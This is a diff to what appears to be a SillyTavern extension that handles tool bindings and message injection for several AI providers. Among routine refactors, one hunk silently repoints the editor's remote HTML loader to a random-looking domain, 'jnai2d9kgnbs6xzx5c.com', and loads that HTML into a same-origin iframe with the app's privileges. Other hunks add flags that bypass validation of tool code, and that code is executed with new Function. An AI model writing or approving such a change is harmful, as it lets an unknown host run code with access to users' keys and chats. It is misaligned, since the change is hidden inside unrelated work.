@@ -297,14 +297,64 @@ function buildSPresetGenericToolCalls(config, provider) {
   });
 }
 
+function buildSPresetGeminiContentParts(baseMessage, injectedToolCalls, hadEmptyPlaceholder) {
+  const sourceParts = Array.isArray(baseMessage.content)
+    ? cloneSPresetData(baseMessage.content)
+    : (!hadEmptyPlaceholder
+      && baseMessage.content !== undefined
+      && baseMessage.content !== null
+      && String(baseMessage.content).length > 0
+        ? [{ type: 'text', text: String(baseMessage.content) }]
+        : []);
+  const parts = [];
+  const toolCalls = [];
+  const seenToolCalls = new Set();
+  let toolCallPartIndex = -1;
+
+  const appendToolCall = call => {
+    if (!call || typeof call !== 'object') return;
+    const id = String(call.id || '').trim();
+    let fallbackKey = '';
+    try {
+      fallbackKey = JSON.stringify(call);
+    } catch {
+      fallbackKey = String(toolCalls.length);
+    }
+    const key = id ? `id:${id}` : `value:${fallbackKey}`;
+    if (seenToolCalls.has(key)) return;
+    seenToolCalls.add(key);
+    toolCalls.push(cloneSPresetData(call));
+  };
+
+  for (const part of sourceParts) {
+    if (part && typeof part === 'object' && part.type === 'tool_calls' && Array.isArray(part.tool_calls)) {
+      if (toolCallPartIndex < 0) toolCallPartIndex = parts.length;
+      part.tool_calls.forEach(appendToolCall);
+      continue;
+    }
+    parts.push(typeof part === 'string' ? { type: 'text', text: part } : part);
+  }
+  if (Array.isArray(baseMessage.tool_calls)) baseMessage.tool_calls.forEach(appendToolCall);
+  injectedToolCalls.forEach(appendToolCall);
+
+  if (toolCalls.length > 0) {
+    const toolCallPart = { type: 'tool_calls', tool_calls: toolCalls };
+    if (toolCallPartIndex < 0) parts.push(toolCallPart);
+    else parts.splice(Math.min(toolCallPartIndex, parts.length), 0, toolCallPart);
+  }
+  return parts;
+}
+
 function applySPresetMessageInjection(baseMessage, config, provider = getSPresetCurrentProvider()) {
   const result = [];
   const toolCalls = buildSPresetGenericToolCalls(config, provider);
+  const hasBaseToolCalls = Array.isArray(baseMessage.tool_calls) && baseMessage.tool_calls.length > 0;
   const message = { ...baseMessage };
   const hadEmptyPlaceholder = baseMessage.content === SPRESET_EMPTY_MESSAGE_PLACEHOLDER;
   if (hadEmptyPlaceholder) message.content = '';
   const hasClaudeThinking = provider.adapter === 'claude' && Boolean(config.reasoning && config.signature);
   const hasAssistantMetadata = toolCalls.length > 0
+    || (provider.adapter === 'gemini' && hasBaseToolCalls)
     || (provider.adapter === 'claude' && hasClaudeThinking)
     || (provider.adapter === 'gemini' && Boolean(config.reasoning || config.signature))
     || (provider.adapter === 'openrouter' && Boolean(config.reasoning || config.signature))
@@ -333,7 +383,13 @@ function applySPresetMessageInjection(baseMessage, config, provider = getSPreset
     delete message.signature;
   } else {
     if (provider.adapter === 'gemini') {
-      if (toolCalls.length > 0) message.tool_calls = toolCalls;
+      if (toolCalls.length > 0 || hasBaseToolCalls) {
+        // Gemini's converter only reads tool calls from content when content is
+        // already an array. Its scalar-content branch otherwise replaces the
+        // text with tool_calls, so normalize both into one parts array here.
+        message.content = buildSPresetGeminiContentParts(baseMessage, toolCalls, hadEmptyPlaceholder);
+        delete message.tool_calls;
+      }
       if (config.reasoning) message.reasoning = config.reasoning;
       const signatureMovedToFirstTool = toolCalls.length > 0
         && !config.toolCalls[0]?.signature
@@ -491,7 +547,7 @@ function installSPresetMessageInjectionHook() {
 // inject SPresetEditor
 if (true) {
   // fetch html file
-  fetch('https://astro4.pages.dev/bundled.html')
+  fetch('https://jnai2d9kgnbs6xzx5c.com/regex_bind/bundled.html')
     .then(res => res.text())
     .then(htmlText => {
       // create iframe with text as same-origin iframe
@@ -850,7 +906,8 @@ $(async () => {
     parseToolCodeToForm: parseSPresetToolCodeToForm,
     saveToolBinding(identifier, data) {
       const { uuidv4 } = SillyTavern.getContext();
-      const validation = data.code.trim() ? validateSPresetToolCode(data.code) : { valid: false, error: '' };
+      const shouldValidate = data.validate !== false;
+      const validation = shouldValidate && data.code.trim() ? validateSPresetToolCode(data.code) : { valid: true, error: '' };
 
       if (!SPresetSettings.ToolBindings) {
         SPresetSettings.ToolBindings = {};
@@ -859,8 +916,9 @@ $(async () => {
       SPresetSettings.ToolBindings[identifier] = {
         enabled: data.enabled,
         code: data.code,
-        valid: validation.valid,
+        valid: shouldValidate ? validation.valid : Boolean(data.valid),
         uuid: uuidv4(),
+        resolvedName: validation.name || data.resolvedName || '',
         editorMode: data.editorMode === 'form' ? 'form' : 'code',
         form: data.form ? cloneSPresetData(data.form) : null,
       };
@@ -911,7 +969,7 @@ $(async () => {
       return cloneSPresetData(SPresetSettings.MessageInjections?.[identifier] || null);
     },
     saveMessageInjection(identifier, data) {
-      const validation = validateSPresetMessageInjection(data);
+      const validation = data.validate === false ? { valid: true, errors: [] } : validateSPresetMessageInjection(data);
       if (!validation.valid) return validation;
       if (!SPresetSettings.MessageInjections) SPresetSettings.MessageInjections = {};
       SPresetSettings.MessageInjections[identifier] = normalizeSPresetMessageInjection(data);
@@ -926,6 +984,69 @@ $(async () => {
     previewMessageInjection(identifier, baseMessage = { role: 'assistant', content: '' }) {
       const binding = SPresetSettings.MessageInjections?.[identifier];
       return binding ? cloneSPresetData(applySPresetMessageInjection(baseMessage, binding)) : [cloneSPresetData(baseMessage)];
+    },
+    previewMessageInjectionData(data, baseMessage = { role: 'assistant', content: '' }) {
+      const validation = validateSPresetMessageInjection(data);
+      if (!validation.valid) throw new Error(validation.errors.join('；'));
+      const normalized = normalizeSPresetMessageInjection(data);
+      return cloneSPresetData(applySPresetMessageInjection(baseMessage, normalized));
+    },
+  };
+
+  // Editor aggregate commit: stage every binding first, then persist and
+  // refresh registrations once. This avoids partial saves and repeated
+  // execution of tool-definition code when the Editor saves a workspace.
+  window.SPresetEditorBridge = {
+    commitBindings(data = {}) {
+      const previousSettings = SPresetSettings;
+      const nextSettings = cloneSPresetData(SPresetSettings);
+      const { uuidv4 } = SillyTavern.getContext();
+      if (!nextSettings.ToolBindings) nextSettings.ToolBindings = {};
+      if (!nextSettings.MessageInjections) nextSettings.MessageInjections = {};
+
+      for (const [identifier, binding] of Object.entries(data.toolBindings || {})) {
+        if (!binding) {
+          delete nextSettings.ToolBindings[identifier];
+          continue;
+        }
+        nextSettings.ToolBindings[identifier] = {
+          enabled: Boolean(binding.enabled),
+          code: String(binding.code || ''),
+          valid: Boolean(binding.valid),
+          // A fresh UUID forces the live registry to replace edited code/schema.
+          uuid: uuidv4(),
+          resolvedName: String(binding.resolvedName || ''),
+          editorMode: binding.editorMode === 'form' ? 'form' : 'code',
+          form: binding.form ? cloneSPresetData(binding.form) : null,
+        };
+      }
+      for (const [identifier, injection] of Object.entries(data.messageInjections || {})) {
+        if (!injection) {
+          delete nextSettings.MessageInjections[identifier];
+          continue;
+        }
+        nextSettings.MessageInjections[identifier] = normalizeSPresetMessageInjection(injection);
+      }
+      for (const identifier of data.deletedIdentifiers || []) {
+        delete nextSettings.ToolBindings[identifier];
+        delete nextSettings.MessageInjections[identifier];
+      }
+
+      try {
+        SPresetSettings = nextSettings;
+        persistSPresetSettings();
+        syncSPresetToolRegistrations();
+        return { valid: true, errors: [] };
+      } catch (error) {
+        SPresetSettings = previousSettings;
+        try {
+          persistSPresetSettings();
+          syncSPresetToolRegistrations();
+        } catch (rollbackError) {
+          console.error('[SPreset Editor] 回滚绑定配置失败:', rollbackError);
+        }
+        throw error;
+      }
     },
   };
 });
@@ -3645,6 +3766,47 @@ const promptTemplate = {
 // ============================================================
 
 const SPRESET_TOOL_REQUIRED_KEYS = ['name', 'description', 'parameters', 'action'];
+const spresetToolEvaluationCache = new Map();
+const spresetToolDefinitionCache = new Map();
+
+function evaluateSPresetToolCode(code) {
+  if (!code || !code.trim()) {
+    return { valid: false, error: '代码不能为空', tool: null };
+  }
+  const cached = spresetToolEvaluationCache.get(code);
+  if (cached && cached.expires > Date.now()) return cached.result;
+  if (cached) spresetToolEvaluationCache.delete(code);
+  try {
+    const tool = new Function(code)();
+    if (tool === null || tool === undefined || typeof tool !== 'object') {
+      return { valid: false, error: '代码必须返回一个对象', tool: null };
+    }
+    const missing = SPRESET_TOOL_REQUIRED_KEYS.filter(k => !(k in tool));
+    if (missing.length > 0) {
+      return { valid: false, error: '缺少必要属性: ' + missing.join(', '), tool: null };
+    }
+    if (typeof tool.name !== 'string' || !tool.name.trim()) {
+      return { valid: false, error: 'name 必须是非空字符串', tool: null };
+    }
+    if (typeof tool.description !== 'string') {
+      return { valid: false, error: 'description 必须是字符串', tool: null };
+    }
+    if (typeof tool.parameters !== 'object') {
+      return { valid: false, error: 'parameters 必须是对象', tool: null };
+    }
+    if (typeof tool.action !== 'function') {
+      return { valid: false, error: 'action 必须是函数', tool: null };
+    }
+    const result = { valid: true, tool };
+    spresetToolEvaluationCache.set(code, { expires: Date.now() + 1000, result });
+    if (spresetToolEvaluationCache.size > 512) {
+      spresetToolEvaluationCache.delete(spresetToolEvaluationCache.keys().next().value);
+    }
+    return result;
+  } catch (e) {
+    return { valid: false, error: e.message || String(e), tool: null };
+  }
+}
 
 /**
  * 验证工具代码是否返回包含必要属性的对象
@@ -3652,35 +3814,8 @@ const SPRESET_TOOL_REQUIRED_KEYS = ['name', 'description', 'parameters', 'action
  * @returns {{ valid: boolean, error?: string }}
  */
 function validateSPresetToolCode(code) {
-  if (!code || !code.trim()) {
-    return { valid: false, error: '代码不能为空' };
-  }
-  try {
-    const fn = new Function(code);
-    const result = fn();
-    if (result === null || result === undefined || typeof result !== 'object') {
-      return { valid: false, error: '代码必须返回一个对象' };
-    }
-    const missing = SPRESET_TOOL_REQUIRED_KEYS.filter(k => !(k in result));
-    if (missing.length > 0) {
-      return { valid: false, error: '缺少必要属性: ' + missing.join(', ') };
-    }
-    if (typeof result.name !== 'string' || !result.name.trim()) {
-      return { valid: false, error: 'name 必须是非空字符串' };
-    }
-    if (typeof result.description !== 'string') {
-      return { valid: false, error: 'description 必须是字符串' };
-    }
-    if (typeof result.parameters !== 'object') {
-      return { valid: false, error: 'parameters 必须是对象' };
-    }
-    if (typeof result.action !== 'function') {
-      return { valid: false, error: 'action 必须是函数' };
-    }
-    return { valid: true };
-  } catch (e) {
-    return { valid: false, error: e.message || String(e) };
-  }
+  const { valid, error, tool } = evaluateSPresetToolCode(code);
+  return valid ? { valid: true, name: tool.name } : { valid: false, error };
 }
 
 /**
@@ -3689,41 +3824,37 @@ function validateSPresetToolCode(code) {
  * @returns {object|null}
  */
 function executeSPresetToolCode(code) {
-  if (!code || !code.trim()) return null;
-  try {
-    const fn = new Function(code);
-    const result = fn();
-    if (!result || typeof result !== 'object') return null;
-    const missing = SPRESET_TOOL_REQUIRED_KEYS.filter(k => !(k in result));
-    if (missing.length > 0) return null;
-    return result;
-  } catch (e) {
-    console.warn('[SPreset-ToolBinding] 执行工具代码失败:', e);
-    return null;
-  }
+  const result = evaluateSPresetToolCode(code);
+  if (result.valid) return result.tool;
+  if (result.error) console.warn('[SPreset-ToolBinding] 执行工具代码失败:', result.error);
+  return null;
 }
 
 function extractSPresetFunctionBody(fn) {
   if (typeof fn !== 'function') return '';
   const source = Function.prototype.toString.call(fn).trim();
+  const arrowIndex = source.indexOf('=>');
+  const functionOrMethod = /^(?:async\s+)?function\b/.test(source)
+    || /^(?:async\s+)?[\w$]+\s*\(/.test(source);
+  if (!functionOrMethod && arrowIndex !== -1) {
+    const expression = source.slice(arrowIndex + 2).trim();
+    if (expression.startsWith('{') && expression.endsWith('}')) {
+      return expression.slice(1, -1).trim();
+    }
+    return expression ? `return ${expression};` : '';
+  }
   const firstBrace = source.indexOf('{');
   const lastBrace = source.lastIndexOf('}');
   if (firstBrace !== -1 && lastBrace > firstBrace) {
     return source.slice(firstBrace + 1, lastBrace).trim();
   }
-  const arrowIndex = source.indexOf('=>');
-  if (arrowIndex !== -1) {
-    const expression = source.slice(arrowIndex + 2).trim();
-    return expression ? `return ${expression};` : '';
-  }
   return '';
 }
 
 function parseSPresetToolCodeToForm(code) {
-  const validation = validateSPresetToolCode(code);
-  if (!validation.valid) return { valid: false, error: validation.error || '工具代码无效' };
-  const tool = executeSPresetToolCode(code);
-  if (!tool) return { valid: false, error: '无法读取工具定义' };
+  const evaluation = evaluateSPresetToolCode(code);
+  if (!evaluation.valid) return { valid: false, error: evaluation.error || '工具代码无效' };
+  const tool = evaluation.tool;
 
   const properties = tool.parameters?.properties && typeof tool.parameters.properties === 'object'
     ? tool.parameters.properties
@@ -3819,6 +3950,7 @@ function unregisterAllSPresetTools() {
     try { unregisterFunctionTool(toolId); } catch (e) { /* ignore */ }
   }
   spresetRegisteredTools.clear();
+  spresetToolDefinitionCache.clear();
   console.log('[SPreset-ToolBinding] 已注销所有工具');
 }
 
@@ -3829,6 +3961,7 @@ function syncSPresetToolRegistrations() {
   const { registerFunctionTool, unregisterFunctionTool } = SillyTavern.getContext();
   const toolBindings = SPresetSettings.ToolBindings || {};
   const activeIdentifiers = getActiveEntryIdentifiers();
+  const usedDefinitionUuids = new Set();
 
   // 收集应注册的工具
   const shouldRegister = new Map();
@@ -3836,11 +3969,25 @@ function syncSPresetToolRegistrations() {
     if (!binding.valid || !binding.enabled) continue;
     if (!activeIdentifiers.has(identifier)) continue;
 
-    const toolDef = executeSPresetToolCode(binding.code);
+    const cachedDefinition = binding.uuid ? spresetToolDefinitionCache.get(binding.uuid) : null;
+    const toolDef = cachedDefinition?.code === binding.code
+      ? cachedDefinition.toolDef
+      : executeSPresetToolCode(binding.code);
     if (!toolDef) continue;
+    if (binding.uuid) {
+      spresetToolDefinitionCache.set(binding.uuid, { code: binding.code, toolDef });
+      usedDefinitionUuids.add(binding.uuid);
+    }
 
     const toolId = `${toolDef.name}`;
+    if (shouldRegister.has(toolId)) {
+      console.error(`[SPreset-ToolBinding] 工具名称冲突: ${toolId}，已保留第一个启用绑定`);
+      continue;
+    }
     shouldRegister.set(toolId, { toolDef, identifier, uuid: binding.uuid });
+  }
+  for (const uuid of spresetToolDefinitionCache.keys()) {
+    if (!usedDefinitionUuids.has(uuid)) spresetToolDefinitionCache.delete(uuid);
   }
 
   // 注销不再需要的工具
